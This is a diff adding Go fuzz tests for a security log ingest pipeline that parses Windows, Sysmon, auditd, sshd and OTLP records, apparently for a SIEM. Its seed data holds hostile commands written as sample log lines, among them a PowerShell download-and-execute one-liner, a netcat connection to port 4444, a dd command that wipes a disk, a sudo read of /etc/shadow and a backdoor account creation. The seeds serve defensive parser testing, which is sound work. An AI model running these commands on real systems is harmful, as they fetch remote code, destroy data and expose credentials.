@@ -1,0 +1,489 @@
+package ingest
+
+import (
+	"bytes"
+	"context"
+	"encoding/json"
+	"errors"
+	"net/netip"
+	"regexp"
+	"strconv"
+	"strings"
+	"testing"
+	"time"
+	"unicode/utf8"
+)
+
+// checkDocTime checks that a written document's time is in ingest's
+// window, which keeps senders from choosing daily indices.
+func checkDocTime(t *testing.T, doc map[string]any) {
+	t.Helper()
+	ts, _ := doc["@timestamp"].(string)
+	at, err := time.Parse(time.RFC3339Nano, ts)
+	if err != nil {
+		t.Fatalf("@timestamp %q: %v", ts, err)
+	}
+	if at.Before(now.Add(-DefaultMaxEventAge)) || at.After(now.Add(MaxEventAhead)) {
+		t.Fatalf("@timestamp %v is outside the window", at)
+	}
+	if _, err := json.Marshal(doc); err != nil {
+		t.Fatalf("document does not encode: %v", err)
+	}
+}
+
+// checkCapped checks that a field holds valid UTF-8 of at most n bytes.
+func checkCapped(t *testing.T, f map[string]any, name string, n int) {
+	t.Helper()
+	v, ok := f[name]
+	if !ok {
+		return
+	}
+	s, ok := v.(string)
+	if !ok {
+		t.Fatalf("%s is %T, not a string", name, v)
+	}
+	if !utf8.ValidString(s) || len(s) > n {
+		t.Fatalf("%s: %d bytes, valid UTF-8 %v", name, len(s), utf8.ValidString(s))
+	}
+}
+
+var bodySeeds = []string{
+	`[{"a":1},{"a":2}]`,
+	" \n[ {\"a\":1} ,\n {\"a\":2} ]\n",
+	"{\"a\":1}\n{\"a\":2}\n",
+	"{\"a\":1}\r\n\r\n{\"a\":2}",
+	"{\n  \"a\": 1,\n  \"b\": {\"c\": 2}\n}\n",
+	"", "  \n", "[]", "[1,2", "[{}]x", `[{"a":[[[[1]]]]}]`,
+	`{"date": 1791720000.5, "level": "warn", "detail": {"a": 1}}`,
+	`[{"date":0},{"date":86400.5},{"date":"9999-12-31T00:00:00Z"},{"date":1e18},{"@timestamp":"2026-10-11 11:00:00"}]`,
+	`{"Channel":"Security","Computer":"DC1","EventID":4625,"TimeCreated":"2199-01-01 00:00:00 +0000"}`,
+	`{"log":"Oct 11 09:15:02 web1 sshd[811]: Failed password for invalid user oracle from 192.0.2.4 port 40122 ssh2"}`,
+	`{"_HOSTNAME":"db1","SYSLOG_IDENTIFIER":"sshd","_PID":"77","MESSAGE":"Failed password for root from 198.51.100.2 port 2222 ssh2","__REALTIME_TIMESTAMP":"1791763200000000"}`,
+	`{"log":"type=EXECVE msg=audit(1760443200.123:4711): argc=3 a0=\"chmod\" a1=\"u+s\" a2=2F746D702F6D7920736800","hostname":"db-01"}`,
+	`{"rule":{"level":10,"id":"5763"},"agent":{"id":"001","name":"web-01"},"data":{"srcip":"192.0.2.4"}}`,
+	`{"signalith_origin":"x","datamodel":"Risk","a.b":1,"":2}`,
+}
+
+func FuzzIngestBody(f *testing.F) {
+	for _, s := range bodySeeds {
+		for _, tag := range []string{"app", "linux.auth", "linux.journal", "linux.audit", "win.security", "wazuh"} {
+			f.Add(tag, []byte(s))
+		}
+	}
+	f.Fuzz(func(t *testing.T, tag string, body []byte) {
+		n, checkErr := checkBody(body)
+		b := &countingBulk{keep: true}
+		p := &Pipeline{Store: b, Prefix: "sig", Now: func() time.Time { return now }}
+		res, err := p.IngestBody(context.Background(), tag, body)
+		if checkErr != nil {
+			// A refused request writes nothing.
+			var bad *BodyError
+			if !errors.As(err, &bad) || len(b.calls) != 0 || p.Stats().Received != 0 {
+				t.Fatalf("checkBody: %v; IngestBody: %v, %d writes", checkErr, err, len(b.calls))
+			}
+			return
+		}
+		if err != nil {
+			t.Fatalf("checkBody passed, IngestBody: %v", err)
+		}
+		if n > MaxRecords || res.Received != n || res.Indexed != n || len(b.docs) != n {
+			t.Fatalf("%d records: %+v, %d documents", n, res, len(b.docs))
+		}
+		ids := map[string]bool{}
+		for _, d := range b.docs {
+			if d.ID == "" || ids[d.ID] {
+				t.Fatalf("document ID %q missing or repeated", d.ID)
+			}
+			ids[d.ID] = true
+			checkDocTime(t, d.Doc)
+		}
+	})
+}
+
+// windowsSeeds are Windows and Sysmon records as Fluent Bit sends them.
+var windowsSeeds = []map[string]any{
+	{"Channel": "Security", "Computer": "DC01.corp.local", "EventID": 4625, "TimeCreated": "2026-10-11 10:00:00 +0000",
+		"StringInserts": []string{"", "", "", "", "S-1-0-0", "administrator", "CORP", "0xC000006D", "", "0xC000006A", "3",
+			"NtLmSsp ", "NTLM", "KALI", "", "", "", "", `C:\Windows\System32\svchost.exe`, "203.0.113.9", "51234"},
+		"Message": "An account failed to log on."},
+	{"Channel": "Security", "Computer": "WS1", "EventID": "4688", "StringInserts": []string{"", "bob", "", "", "0x1a2c",
+		`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, "", "", "powershell -enc AAA", "", "", "", "", `C:\Windows\explorer.exe`}},
+	{"Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS1", "EventID": 1,
+		"Message": "Process Create:\r\nImage: C:\\Users\\bob\\evil.exe\r\nCommandLine: evil.exe\r\nUser: CORP\\bob\r\nHashes: SHA1=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,MD5=BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB,SHA256=CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC,IMPHASH=DD"},
+	{"Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS1", "EventID": 1,
+		"Message": "Process Create:\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nOriginalFileName: Cmd.Exe\r\n" +
+			"CommandLine: cmd /c echo one\r\necho two\r\n\r\necho three\r\nCurrentDirectory: C:\\Temp\\\r\n" +
+			"User: CORP\\bob\r\nLogonId: 0x3E7\r\nIntegrityLevel: High\r\nParentProcessId: 77\r\nParentUser: CORP\\svc"},
+	{"Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS1", "EventID": 3, "ProviderName": "Microsoft-Windows-Sysmon",
+		"Message": "Network connection detected:\r\nRuleName: -\r\nImage: C:\\Tools\\nc.exe\r\nUser: CORP\\bob\r\nProtocol: tcp\r\nSourceIsIpv6: False\r\nSourceIp: 10.0.0.5\r\nSourcePort: 50000\r\nDestinationIp: 198.51.100.7\r\nDestinationHostname: -\r\nDestinationPort: 4444\r\nDestinationPortName: -"},
+	{"Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS1", "EventID": 27,
+		"Message": "File Block Executable:\r\nImage: C:\\Windows\\System32\\curl.exe\r\nTargetFilename: C:\\Users\\bob\\x.exe\r\nUser: CORP\\bob"},
+	{"Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS1", "EventID": 13,
+		"Message": "Registry value set:\r\nEventType: SetValue\r\nImage: C:\\x.exe\r\nTargetObject: HKU\\S-1-5-21\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater\r\nDetails: C:\\Users\\bob\\u.exe"},
+	{"Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS1", "EventID": 22,
+		"Message": "Dns query:\r\nImage: C:\\x.exe\r\nQueryName: bad.example\r\nQueryStatus: 9003\r\nQueryResults: -"},
+	{"Channel": "Microsoft-Windows-PowerShell/Operational", "Computer": "WS1", "EventID": "4104",
+		"StringInserts": []string{"2", "3", "IEX (New-Object Net.WebClient).DownloadString('http://x')", "{5d1b4c2e-0d3a-4b8e-9c71-2a5d8e4f9b10}", ""}},
+	WinEventRecord(SystemChannel, "7045", "WS1", now, map[string]string{"ServiceName": "evil", "ImagePath": `C:\evil.exe`}),
+}
+
+func FuzzNormalizeWindows(f *testing.F) {
+	for _, r := range windowsSeeds {
+		b, err := json.Marshal(r)
+		if err != nil {
+			f.Fatal(err)
+		}
+		f.Add(b)
+	}
+	f.Add([]byte(`{"Channel":"Security","EventID":4625,"StringInserts":[1,null,{"a":1},[2]],"Computer":7}`))
+	f.Fuzz(func(t *testing.T, b []byte) {
+		dec := json.NewDecoder(bytes.NewReader(b))
+		dec.UseNumber()
+		var r map[string]any
+		if dec.Decode(&r) != nil || r == nil {
+			return
+		}
+		for _, tag := range []string{"win.security", "win.sysmon", "win.events"} {
+			ev := Normalize(tag, r, now)
+			if ev.Model == "" || ev.Fields == nil || ev.Fields["message"] == nil {
+				t.Fatalf("%s: model %q fields %v", tag, ev.Model, ev.Fields)
+			}
+			if !IsWazuhAlert(r) {
+				// The host name is cut to the DNS limit.
+				if h, ok := ev.Fields["host"].(string); ok && len(h) > maxHostLen {
+					t.Fatalf("%s: host is %d bytes", tag, len(h))
+				}
+			}
+			if _, err := json.Marshal(ev.Document()); err != nil {
+				t.Fatalf("%s: %v", tag, err)
+			}
+		}
+	})
+}
+
+func FuzzLinuxSysmonXML(f *testing.F) {
+	f.Add(linuxSysmonProcess)
+	f.Add(LinuxSysmonRecord("11", "db01", now, map[string]string{"Image": "/usr/bin/cp", "TargetFilename": "/etc/cron.d/<x>&y", "User": "root"})["MESSAGE"].(string))
+	f.Add(LinuxSysmonRecord("3", "web01", now, map[string]string{"Image": "/usr/bin/nc", "Protocol": "tcp", "SourceIp": "10.0.0.5",
+		"SourcePort": "50000", "DestinationIp": "198.51.100.7", "DestinationPort": "4444", "User": "root"})["MESSAGE"].(string))
+	f.Add(`<Event><System><EventID>1</EventID><Computer>` + strings.Repeat("h", 300) + `</Computer></System></Event>`)
+	f.Add("<Event><System>")
+	f.Add("<Event><EventData><Data Name=\"Image\">-</Data></EventData></Event>")
+	f.Fuzz(func(t *testing.T, msg string) {
+		ev := ParseProgram("web01", "sysmon", "25330", msg, "syslog")
+		fs := ev.Fields
+		if fs["vendor_product"] != "Sysmon for Linux" {
+			return
+		}
+		if !strings.HasPrefix(strings.TrimSpace(msg), "<Event") {
+			t.Fatalf("read as Sysmon: %q", msg)
+		}
+		if fs["sourcetype"] != SysmonLinuxSourcetype || fs["signature_id"] == "" || fs["app"] != nil {
+			t.Fatalf("fields %v", fs)
+		}
+		checkCapped(t, fs, "host", maxHostLen)
+		checkCapped(t, fs, "dest", maxHostLen)
+		// The event's text came through the XML decoder, which refuses
+		// invalid UTF-8.
+		for k, v := range fs {
+			if s, ok := v.(string); ok && !utf8.ValidString(s) {
+				t.Fatalf("%s: invalid UTF-8 %q", k, s)
+			}
+		}
+		// The journal's record of it reads the same.
+		rec := map[string]any{"SYSLOG_IDENTIFIER": "sysmon", "_HOSTNAME": "web01", "_PID": "25330", "MESSAGE": msg}
+		if j := Normalize("linux.journal", rec, now); j.Model != ev.Model || j.Fields["signature_id"] != fs["signature_id"] {
+			t.Fatalf("journal: model %s, syslog: %s", j.Model, ev.Model)
+		}
+	})
+}
+
+var auditdSeeds = []string{
+	`type=EXECVE msg=audit(1760443200.123:4711): argc=3 a0="chmod" a1="u+s" a2=2F746D702F6D7920736800`,
+	"type=SYSCALL msg=audit(1760443200.123:4711): arch=c000003e syscall=59 success=yes exit=0 a0=55d5 ppid=900 pid=901 auid=1000 uid=0 euid=0 comm=\"chmod\" exe=\"/usr/bin/chmod\" key=\"exec\"\x1dARCH=x86_64 SYSCALL=execve AUID=\"bob\" UID=\"root\" EUID=\"root\"",
+	`type=PROCTITLE msg=audit(1760443200.123:4711): proctitle=7375646F0063686F776E00726F6F74`,
+	`type=SERVICE_STOP msg=audit(1760443200.500:4712): pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=auditd comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'`,
+	`type=ADD_USER msg=audit(1760443200.600:4713): pid=2 uid=0 auid=1000 ses=3 msg='op=adding user id=1001 exe="/usr/sbin/useradd" acct="eve" res=success'`,
+	`type=EXECVE msg=audit(1760443200.700:4714): argc=2 a0="bash" a1_len=6 a1[0]="-c " a1[1]="id"`,
+	`type=SYSCALL msg=audit(04/16/2025 08:20:23.552:47372) : arch=x86_64 syscall=execve success=yes exit=0 ppid=5153 pid=6324 auid=ubuntu uid=ubuntu comm=whoami exe=/usr/bin/whoami key=recon`,
+	`type=PATH msg=audit(04/16/2025 08:20:23.552:47372) : item=0 name=cafe nametype=CREATE`,
+	`type=PROCTITLE msg=audit(02/20/2025 10:00:25.563:44654) : proctitle=dd if=/dev/zero of=/dev/sda bs=1M`,
+	`node=db2 type=EXECVE msg=audit(1760443200.123:9): argc=1 a0="id"`,
+	`type=EXECVE msg=audit(99999999999999999999.9:1): argc=99 a0=FF a1=C3 name=FFFE`,
+	"type=X msg=audit(1.1:1): a b c\td=e 'f=g",
+}
+
+var auditdType = regexp.MustCompile(`^[A-Z0-9_]+$`)
+
+func FuzzReadAuditd(f *testing.F) {
+	for _, s := range auditdSeeds {
+		f.Add(s)
+	}
+	f.Fuzz(func(t *testing.T, line string) {
+		rec, ok := ReadAuditd(line)
+		if ok != IsAuditdLine(line) {
+			t.Fatalf("ReadAuditd %v, IsAuditdLine %v", ok, !ok)
+		}
+		if ok {
+			if !auditdType.MatchString(rec.Type) {
+				t.Fatalf("type %q", rec.Type)
+			}
+			for k := range rec.Fields {
+				if k == "" || strings.ContainsAny(k, " \t") {
+					t.Fatalf("field name %q", k)
+				}
+			}
+		}
+		ev := Normalize("linux.audit", AuditdRecordFor(line, "db-01"), now)
+		fs := ev.Fields
+		if ev.Model != "Other" || fs["sourcetype"] != AuditdSourcetype || fs["message"] != line {
+			t.Fatalf("model %s fields %v", ev.Model, fs)
+		}
+		checkCapped(t, fs, "host", maxHostLen)
+		checkCapped(t, fs, "dest", maxHostLen)
+		if !ok {
+			return
+		}
+		if fs["vendor_product"] != AuditdProduct || fs["auditd_type"] != rec.Type || fs["auditd_id"] != rec.Serial {
+			t.Fatalf("fields %v", fs)
+		}
+		// A record's values are capped; its serial number is the header's.
+		for k := range fs {
+			if strings.HasPrefix(k, "auditd_") && k != "auditd_id" {
+				checkCapped(t, fs, k, MaxValueLen)
+			}
+		}
+		for _, k := range []string{"process", "process_path", "process_name", "user"} {
+			checkCapped(t, fs, k, MaxValueLen)
+		}
+	})
+}
+
+var programSeeds = [][2]string{
+	{"sshd", "Failed password for invalid user oracle from 192.0.2.4 port 40122 ssh2"},
+	{"sshd", "Accepted publickey for deploy from 192.0.2.10 port 40200 ssh2: RSA SHA256:abc"},
+	{"sshd-session", "Accepted password for root from 192.0.2.11 port 50000 ssh2"},
+	{"sshd", "Failed publickey for invalid user x from 198.51.100.7 port 22 ssh2: RSA SHA256:fake from 203.0.113.50 port 40000 ssh2: ED25519 SHA256:real"},
+	{"sshd", "Invalid user admin from 198.51.100.7 from 203.0.113.50"},
+	{"sshd", "Invalid user admin from host.example port 22"},
+	{"sudo", "   alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow"},
+	{"sudo", "   alice : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/bash"},
+	{"sudo", "pam_unix(sudo:auth): authentication failure; logname=alice uid=1000 euid=0 tty=/dev/pts/0 ruser=alice rhost=  user=alice"},
+	{"su", "pam_unix(su:session): session opened for user root(uid=0) by alice(uid=1000)"},
+	{"su", "pam_unix(su-l:auth): authentication failure; logname=bob uid=1000 euid=0 tty=pts/0 ruser=bob rhost=  user=root"},
+	{"useradd", "new user: name=backdoor, UID=1002, GID=1002, home=/home/backdoor, shell=/bin/bash"},
+	{"userdel", "delete user 'backdoor'"},
+	{"usermod", "add 'eve' to group 'sudo'"},
+	{"gpasswd", "add 'eve' to shadow group 'wheel'"},
+	{"cron", "(root) CMD (run-parts /etc/cron.hourly)"},
+	{"audisp-syslog", `node=db2 type=EXECVE msg=audit(1760443200.123:9): argc=1 a0="id"`},
+}
+
+func FuzzParseProgram(f *testing.F) {
+	for _, s := range programSeeds {
+		f.Add(s[0], s[1])
+	}
+	f.Fuzz(func(t *testing.T, program, msg string) {
+		ev := ParseProgram("web1", program, "811", msg, "linux:auth")
+		if ev.Model == "" || ev.Fields == nil || ev.Fields["sourcetype"] == nil {
+			t.Fatalf("model %q fields %v", ev.Model, ev.Fields)
+		}
+		fs := ev.Fields
+		if ev.Model == "Authentication" {
+			if a := fs["action"]; a != "success" && a != "failure" {
+				t.Fatalf("action %v", a)
+			}
+		}
+		// sshd prints an address, never a name, and a source that cannot
+		// be told is left out.
+		if src, ok := fs["src"].(string); ok && strings.HasPrefix(program, "sshd") {
+			if _, err := netip.ParseAddr(src); err != nil || fs["src_ambiguous"] != nil {
+				t.Fatalf("src %q, src_ambiguous %v", src, fs["src_ambiguous"])
+			}
+		}
+		// The whole syslog line is kept as the message.
+		line := "Oct 11 09:15:02 web1 " + program + "[811]: " + msg
+		if got := Normalize("linux.auth", map[string]any{"log": line}, now).Fields["message"]; got != line {
+			t.Fatalf("message %q, want %q", got, line)
+		}
+	})
+}
+
+// otlpSeeds are OTLP requests from the OTLP tests.
+var otlpSeeds = func() []tRes {
+	deep := any("x")
+	for range MaxDepth - 1 {
+		deep = []any{deep}
+	}
+	return []tRes{
+		{attrs: host, scope: "app.logger", recs: []tRec{{
+			time: uint64(now.Add(-time.Minute).UnixNano()), sev: 17, body: "payment failed",
+			attrs: []tKV{{"user.name", "ann"}, {"client.address", "203.0.113.9"}, {"http.route", "/pay"},
+				{"retries", 3}, {"tags", []any{"a", "b"}}, {"ratio", 0.5}, {"ok", false}},
+			trace: []byte{1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16},
+			span:  []byte{0, 0, 0, 0, 0, 0, 0, 0},
+		}}},
+		{attrs: host, recs: []tRec{{
+			observed: uint64(now.Add(-2 * time.Second).UnixNano()), sevText: "Warning",
+			body: []tKV{{"msg", "disk almost full"}, {"disk", []tKV{{"free_pct", 3}}}, {"bin", []byte("hi")}},
+		}}},
+		{attrs: host, recs: []tRec{{
+			observed: uint64(now.UnixNano()),
+			body:     "Oct 11 09:15:02 web1 sshd[811]: Failed password for bob from 192.0.2.4 port 50022 ssh2",
+			attrs:    []tKV{{"log.file.name", "auth.log"}},
+		}}},
+		{recs: []tRec{{
+			time: uint64(now.Add(-time.Hour).UnixNano()), sev: 9, sevText: "info",
+			body: "<38>Oct 11 11:00:00 bastion sshd[42]: Accepted publickey for alice from 198.51.100.4 port 2222 ssh2",
+			attrs: []tKV{{"appname", "sshd"}, {"hostname", "bastion"}, {"proc_id", "42"}, {"facility", 4},
+				{"message", "Accepted publickey for alice from 198.51.100.4 port 2222 ssh2"}},
+		}}},
+		{recs: []tRec{{
+			body: []tKV{{"MESSAGE", "Invalid user admin from 203.0.113.50 port 4242"}, {"SYSLOG_IDENTIFIER", "sshd"},
+				{"_HOSTNAME", "db1"}, {"_PID", "99"}, {"__REALTIME_TIMESTAMP", strconv.FormatInt(now.Add(-time.Minute).UnixMicro(), 10)}},
+		}}},
+		{attrs: []tKV{{"host.name", "ignored"}}, recs: []tRec{{
+			body: windowsBody("Security", 4625, []tKV{{"TargetUserName", "administrator"}, {"IpAddress", "203.0.113.9"}, {"LogonType", "3"}}, true, "An account failed to log on."),
+		}}},
+		{recs: []tRec{{body: windowsBody("Microsoft-Windows-Sysmon/Operational", 3, []tKV{{"Image", `C:\Tools\nc.exe`}, {"Protocol", "tcp"},
+			{"SourceIp", "10.0.0.5"}, {"DestinationIp", "198.51.100.7"}, {"DestinationPort", "4444"}}, false, "")}}},
+		{attrs: []tKV{{"host.name", "a"}}, recs: []tRec{{body: "one"}, {body: "two"}}},
+		{recs: []tRec{{time: 1<<64 - 1, body: deep, eventName: "e", sev: -1}}},
+	}
+}()
+
+// valueLevels is how many levels of AnyValue a decoded value has.
+func valueLevels(v any) int {
+	n := 0
+	switch x := v.(type) {
+	case []any:
+		for _, e := range x {
+			n = max(n, valueLevels(e))
+		}
+	case map[string]any:
+		for _, e := range x {
+			n = max(n, valueLevels(e))
+		}
+	}
+	return n + 1
+}
+
+var lowerHex = regexp.MustCompile(`^([0-9a-f]{2})*$`)
+
+// checkOTLPLog checks a decoded log record: valid UTF-8 text, nesting
+// within MaxDepth, and IDs as lower-case hex.
+func checkOTLPLog(t *testing.T, l *otlpLog) {
+	t.Helper()
+	var text func(v any)
+	text = func(v any) {
+		switch x := v.(type) {
+		case string:
+			if !utf8.ValidString(x) {
+				t.Fatalf("invalid UTF-8 %q", x)
+			}
+		case []any:
+			for _, e := range x {
+				text(e)
+			}
+		case map[string]any:
+			for k, e := range x {
+				text(k)
+				text(e)
+			}
+		}
+	}
+	text(l.resource)
+	text(l.attrs)
+	text(l.body)
+	text(l.scope)
+	text(l.sevText)
+	text(l.eventName)
+	if valueLevels(l.body) > MaxDepth {
+		t.Fatalf("body nests %d levels", valueLevels(l.body))
+	}
+	for _, m := range []map[string]any{l.resource, l.attrs} {
+		for k, v := range m {
+			if valueLevels(v) > MaxDepth {
+				t.Fatalf("%s nests %d levels", k, valueLevels(v))
+			}
+		}
+	}
+	if !lowerHex.MatchString(l.traceID) || !lowerHex.MatchString(l.spanID) {
+		t.Fatalf("trace %q span %q", l.traceID, l.spanID)
+	}
+}
+
+// fuzzOTLP checks one OTLP request in either encoding: the check and the
+// build pass agree, and IngestOTLP writes every record or none.
+func fuzzOTLP(t *testing.T, body []byte, isJSON bool) {
+	walk := walkOTLPProto
+	if isJSON {
+		walk = walkOTLPJSON
+	}
+	checked := 0
+	checkErr := walk(body, false, func(l *otlpLog, _ int) error {
+		if l != nil {
+			t.Fatal("the check pass built a record")
+		}
+		checked++
+		return nil
+	})
+	built := 0
+	buildErr := walk(body, true, func(l *otlpLog, size int) error {
+		if size > MaxRecordBytes {
+			t.Fatalf("record of %d bytes", size)
+		}
+		checkOTLPLog(t, l)
+		built++
+		return nil
+	})
+	if (checkErr == nil) != (buildErr == nil) || checked != built {
+		t.Fatalf("check: %d records, %v; build: %d records, %v", checked, checkErr, built, buildErr)
+	}
+	b := &countingBulk{keep: true}
+	p := &Pipeline{Store: b, Prefix: "sig", Now: func() time.Time { return now }}
+	res, err := p.IngestOTLP(context.Background(), body, isJSON)
+	if checkErr != nil {
+		var bad *BodyError
+		if !errors.As(err, &bad) || !errors.As(checkErr, &bad) || len(b.calls) != 0 {
+			t.Fatalf("check: %v; IngestOTLP: %v, %d writes", checkErr, err, len(b.calls))
+		}
+		return
+	}
+	if err != nil || res.Received != checked || res.Indexed != checked || len(b.docs) != checked {
+		t.Fatalf("%d records: %+v, %v, %d documents", checked, res, err, len(b.docs))
+	}
+	for _, d := range b.docs {
+		checkDocTime(t, d.Doc)
+	}
+}
+
+func FuzzOTLPJSON(f *testing.F) {
+	for _, r := range otlpSeeds {
+		f.Add(encodeJSON(r))
+	}
+	f.Add(encodeJSON(otlpSeeds...))
+	for _, s := range []string{
+		"", "{}", "[1,2", `{"resourceLogs":[{"scopeLogs":[{"logRecords":[{"body":{"intValue":"x"}}]}]}]}`,
+		`{"resourceLogs":[{"scopeLogs":[{"logRecords":[{"body":{"stringValue":"ok"}},{"attributes":7}]}]}]}`,
+		`{"resourceLogs":[{"scopeLogs":[{"logRecords":[{"timeUnixNano":"-5","severityNumber":1e3,"traceId":"ZZ","body":{"doubleValue":"NaN"}}]}]}]}`,
+	} {
+		f.Add([]byte(s))
+	}
+	f.Fuzz(func(t *testing.T, body []byte) {
+		fuzzOTLP(t, body, true)
+	})
+}
+
+func FuzzOTLPProto(f *testing.F) {
+	for _, r := range otlpSeeds {
+		f.Add(encodeProto(r))
+	}
+	f.Add(encodeProto(otlpSeeds...))
+	f.Add(encodeProto(otlpSeeds[0])[:12])
+	f.Add([]byte{0x0b})
+	f.Add([]byte{})
+	f.Fuzz(func(t *testing.T, body []byte) {
+		fuzzOTLP(t, body, false)
+	})
+}
